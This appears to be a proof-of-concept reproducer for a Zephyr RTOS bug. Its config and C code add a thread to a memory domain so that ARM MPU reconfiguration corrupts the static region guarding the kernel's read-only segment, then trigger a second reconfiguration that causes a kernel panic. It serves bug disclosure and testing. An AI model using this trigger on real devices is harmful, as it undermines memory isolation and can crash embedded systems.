## prj.conf
```kconfig
# memory partitions/domains require CONFIG_USERSPACE
CONFIG_USERSPACE=y

# mpu configuration errors are only caught by an __ASSERT()
# if asserts aren't enabled, errors are silently discarded...
CONFIG_ASSERT=y

# repro code only works when gap filling is enabled...
# ...but I suspect a wider issue that exists regardless
# of the value of this option. Good enough for PoC.
CONFIG_MPU_GAP_FILLING=y
```

## src/main.c
```c
/*
 * Copyright (c) 2012-2014 Wind River Systems, Inc.
 *
 * SPDX-License-Identifier: Apache-2.0
 */

#include <cmsis_core.h>

#include <zephyr/arch/arm/mpu/arm_mpu.h>

#include <zephyr/kernel.h>
#include <zephyr/app_memory/mem_domain.h>
#include <zephyr/linker/linker-defs.h>
#include <zephyr/toolchain.h>

/*
 * Random data generated using the Python script that follows.
 * Contents are irrelevant - all zeros would have worked fine.

SIZE=512
STRIDE=8
for i in range(0, SIZE, STRIDE):
	print(end="  ")
	for j in range(STRIDE):
		print(f" 0x{random.randint(0, 255):02x},", end="")
	print()

 * Attempt to place at the end of `.rodata` using a named section
 * to avoid "unmapping" parts of the kernel when triggering the bug.
 * (although the backgroung region should keep it mapped, I think...?)
 *
 * `.rodata` is itself at the end of the kernel RO segment so shrinking
 * the static section before the victim_array should not unmap anything
 * important for the kernel.
 *
 * Note also the alignment to MPU region granularity (= 32 bytes).
 */
#define SIZE 512

__aligned(32)
Z_GENERIC_SECTION(".rodata.zzz_at_the_end")
static const uint8_t victim_array[SIZE] = {
	0x3c, 0x70, 0xd9, 0xf1, 0xfc, 0xa9, 0x75, 0x71,
	0x31, 0x9b, 0x37, 0x64, 0xc7, 0xd3, 0xc2, 0xed,
	0xf0, 0xd3, 0x75, 0x24, 0x98, 0x97, 0x56, 0x92,
	0x1f, 0x9e, 0xca, 0x32, 0xae, 0x58, 0x8a, 0xe8,
	0xee, 0x62, 0xc0, 0xaa, 0x4d, 0x95, 0xb5, 0x67,
	0x04, 0xe1, 0x89, 0x0f, 0xf0, 0xdf, 0x55, 0xdf,
	0x3f, 0x14, 0x6f, 0xd4, 0xb5, 0x98, 0xc1, 0x6f,
	0xa5, 0xba, 0x9a, 0xaf, 0xe9, 0xe3, 0xcc, 0x95,
	0xee, 0xc5, 0xb9, 0x51, 0x59, 0xe5, 0x41, 0xed,
	0x0a, 0x32, 0x4b, 0x4c, 0xec, 0x33, 0xc7, 0x39,
	0x9a, 0xc8, 0xb6, 0xfd, 0x78, 0xe3, 0xb5, 0x56,
	0xd3, 0x8c, 0x37, 0x1b, 0xc0, 0x7a, 0xef, 0xcf,
	0x51, 0xd7, 0x64, 0xf4, 0x37, 0x4f, 0x41, 0x8b,
	0x23, 0x9c, 0x9b, 0x66, 0xf6, 0x50, 0x4d, 0x69,
	0x48, 0xbc, 0x6d, 0x0c, 0x5d, 0x5e, 0x6f, 0x9b,
	0x27, 0x80, 0xb9, 0xd5, 0x05, 0xe1, 0xdc, 0xf5,
	0x57, 0x03, 0x1e, 0xd9, 0xf5, 0xf3, 0x43, 0xb6,
	0x0c, 0x80, 0x64, 0x2b, 0x90, 0x57, 0x45, 0x4b,
	0x71, 0x9a, 0x0c, 0xb7, 0xed, 0xd8, 0x96, 0x99,
	0x8c, 0x32, 0xcb, 0x3d, 0x23, 0x36, 0x61, 0xb2,
	0xf8, 0x0d, 0x1c, 0x03, 0xec, 0x8f, 0xd1, 0xb4,
	0x58, 0x1b, 0xe7, 0x30, 0x5e, 0xd5, 0xb0, 0x91,
	0x36, 0x38, 0x5a, 0x09, 0xd3, 0x33, 0x0f, 0xb7,
	0x00, 0x77, 0xaa, 0x0d, 0x8e, 0xd4, 0xf4, 0xc5,
	0x71, 0x1f, 0xe7, 0x10, 0x1e, 0x8f, 0xbc, 0xa9,
	0xc7, 0xc1, 0xf5, 0xad, 0x54, 0x2c, 0x80, 0xad,
	0xad, 0x6f, 0xcf, 0x97, 0xdf, 0x87, 0x99, 0x94,
	0xf1, 0xc3, 0x06, 0xab, 0xd4, 0xd7, 0x42, 0xeb,
	0x52, 0x96, 0xe1, 0x4c, 0x74, 0x63, 0xaa, 0x57,
	0x4f, 0x65, 0x79, 0x07, 0x57, 0xd2, 0xff, 0x15,
	0xf7, 0x0e, 0xc6, 0x49, 0x38, 0x9a, 0x3f, 0x4b,
	0x3e, 0xb3, 0x2f, 0xa0, 0xc9, 0xc4, 0x7e, 0x7f,
	0x99, 0xb6, 0x11, 0x7b, 0x19, 0x20, 0xfe, 0x9f,
	0x99, 0x3b, 0x3d, 0xbd, 0xa4, 0x43, 0x3e, 0x8e,
	0x3b, 0xca, 0xeb, 0xc5, 0x5d, 0x7b, 0xd2, 0x49,
	0xfc, 0xbf, 0xac, 0xf6, 0x88, 0x0d, 0x81, 0x67,
	0xba, 0xb7, 0x27, 0x76, 0x4c, 0xe9, 0x42, 0x05,
	0x66, 0xa1, 0xdd, 0xfa, 0xaa, 0x92, 0x2c, 0x47,
	0x8d, 0xa6, 0x26, 0x9a, 0xbe, 0x2a, 0xcc, 0xfe,
	0x1e, 0x30, 0x7f, 0x9b, 0xea, 0xdb, 0xb9, 0x36,
	0xf9, 0xfa, 0x00, 0x69, 0xd6, 0xf7, 0x4e, 0x98,
	0x07, 0x55, 0x49, 0x1a, 0x02, 0xaa, 0x88, 0xeb,
	0x1d, 0x12, 0x12, 0xea, 0x8c, 0x91, 0x69, 0x6d,
	0x34, 0x4f, 0x1a, 0xbb, 0x8f, 0xc5, 0xda, 0x20,
	0x47, 0x2f, 0x0c, 0x9d, 0x4f, 0xd5, 0x32, 0x63,
	0x58, 0xb2, 0x33, 0x1f, 0x4d, 0xa6, 0xa2, 0xf9,
	0xbd, 0x2d, 0x43, 0x3b, 0x7c, 0xcf, 0x49, 0x12,
	0x5e, 0x47, 0x56, 0x87, 0x1d, 0x35, 0x1c, 0x10,
	0x26, 0x95, 0x81, 0x8c, 0xd8, 0x45, 0x0f, 0xaf,
	0x88, 0x7a, 0xa8, 0xd6, 0xd7, 0xa9, 0x46, 0x85,
	0x65, 0xde, 0xb3, 0xb9, 0x93, 0x03, 0xf0, 0x54,
	0x57, 0x6f, 0x9a, 0xfc, 0x30, 0xec, 0x97, 0x29,
	0x96, 0xd8, 0x5c, 0xf7, 0x24, 0x86, 0x80, 0xc2,
	0x40, 0x87, 0xa4, 0x3e, 0x29, 0x1d, 0xe6, 0xd3,
	0x45, 0x66, 0xc3, 0x20, 0x7d, 0xc9, 0xd4, 0xda,
	0x3b, 0x3f, 0xb8, 0xe5, 0x41, 0xe6, 0xca, 0x06,
	0x5d, 0xa3, 0x13, 0x99, 0xeb, 0xa1, 0x9c, 0xcc,
	0x11, 0xa7, 0x76, 0xf9, 0xff, 0x58, 0xa6, 0xf0,
	0x41, 0x74, 0x0b, 0xc5, 0x99, 0xaf, 0xbf, 0xcc,
	0x23, 0x81, 0x87, 0xef, 0x32, 0x28, 0x4d, 0x08,
	0xa0, 0x01, 0x0c, 0xda, 0xe6, 0x46, 0x75, 0x29,
	0x55, 0xf4, 0x24, 0xab, 0xd2, 0x50, 0x84, 0x7e,
	0xe7, 0x35, 0x77, 0xc0, 0x19, 0x1f, 0x19, 0x7d,
	0x7f, 0xf4, 0x4c, 0x33, 0x80, 0x5f, 0xf1, 0x1f,
};

static void dump_mpu(void)
{
	const uint32_t NUM_REGIONS = _FLD2VAL(MPU_TYPE_DREGION, MPU->TYPE);

	printk("[*] MPU regions dump:\n");
	for (int i = 0; i < NUM_REGIONS; i++) {
		MPU->RNR = i;

		const uint32_t rbar = MPU->RBAR, rlar = MPU->RLAR;
		const uint32_t start = rbar & MPU_RBAR_BASE_Msk;
		const uint32_t end   = (rlar & MPU_RLAR_LIMIT_Msk) | ~MPU_RLAR_LIMIT_Msk;

		if (rlar == 0) {
			//don't dump cleared regions
			continue;
		}

		printk("     Region %2u: RBAR=0x%08x RLAR=0x%08x (range: 0x%08x~0x%08x)\n",
			i, rbar, rlar, start, end);
	}
}

void k_sys_fatal_error_handler(unsigned reason, const struct arch_esf *esf)
{
	printk("\n");
	printk("[+] k_sys_fatal_error_handler(reason=%u)\n", reason);
	dump_mpu();
	printk("[+] Halting kernel...\n");

	k_fatal_halt(reason);
}

static void dummy_thr_fn(void *a1, void *a2, void *a3)
{
	ARG_UNUSED(a1);
	ARG_UNUSED(a2);
	ARG_UNUSED(a3);
	printk("Dummy thread speaking here\n");
	return;
}

K_THREAD_STACK_DEFINE(dummy_thr_stk, 512);
struct k_thread dummy_thread;

int main(void)
{
	int res;
	printk("[*] __rom_region_start=%p\n", (void *)__rom_region_start);
	printk("[*]   __rom_region_end=%p\n", (void *)__rom_region_end);
	printk("[*] victim_array start=%p\n", (void *)victim_array);
	printk("[*]   victim_array end=%p\n", (void *)(victim_array + SIZE - 1));
	dump_mpu();

	struct k_mem_partition va_part = {
		.start = (uintptr_t)victim_array,
		.size = SIZE,
		// I don't think the permissions really matter
		.attr = K_MEM_PARTITION_P_RO_U_RO,
	};

	struct k_mem_domain domain;

	k_mem_domain_init(&domain, 0, NULL);

#ifdef Z_LIBC_PARTITION_EXISTS
	// taken from llext test code, dunno if actually useful...
	k_mem_domain_add_partition(&domain, &z_libc_partition);
#endif

	res = k_mem_domain_add_partition(&domain, &va_part);
	if (res != 0) {
		printk("[-] Failed to add victim partition to domain\n");
		return 0;
	}

	{
		printk("[*] Step 1: corrupt static MPU region for RO segment\n");

		//
		// VERY IMPORTANT: do NOT make this a K_USER thread
		//
		// If this is created as K_USER, it seems the MPU configuration
		// is "applied twice" and the kernel panic we want to trigger
		// occurs directly upon context switch. By making this a kernel
		// thread, the panic will occur only in step 2.
		//

		k_thread_create(&dummy_thread, dummy_thr_stk,
				K_THREAD_STACK_SIZEOF(dummy_thr_stk),
				dummy_thr_fn, NULL, NULL, NULL,
				0, 0, K_FOREVER);

		res = k_mem_domain_add_thread(&domain, &dummy_thread);
		if (res != 0) {
			printk("[-] Failed to add dummy thread to domain\n");
			return 0;
		}

		// let the thread execute
		// this will trigger MPU reconfiguration and corrupt
		// the static MPU region covering RO segment as we want
		k_thread_start(&dummy_thread);
		k_thread_join(&dummy_thread, K_FOREVER);

		printk("[*] Displaying corrupted MPU configuration...\n");
		dump_mpu();
	}

	{
		printk("[*] Step 2: trigger MPU configuration fail\n");

		k_thread_create(&dummy_thread, dummy_thr_stk,
				K_THREAD_STACK_SIZEOF(dummy_thr_stk),
				dummy_thr_fn, NULL, NULL, NULL,
				0, 0, K_FOREVER);

		res = k_mem_domain_add_thread(&domain, &dummy_thread);
		if (res != 0) {
			printk("[-] Failed to add dummy thread to domain\n");
			return 0;
		}

		printk("\n");

		// Let the thread execute.
		// This will trigger MPU reconfiguration which will fail
		// due to the corrupted static MPU region no longer covering
		// the kernel's RO segment, causing a kernel panic due to
		// assertion failure.
		k_thread_start(&dummy_thread);
		k_thread_join(&dummy_thread, K_FOREVER);
	}

	printk("[?] No kernel panic occured - everything is fine?\n");
	printk("[?] Checking MPU configuration...\n");
	dump_mpu();

	return 0;
}
```
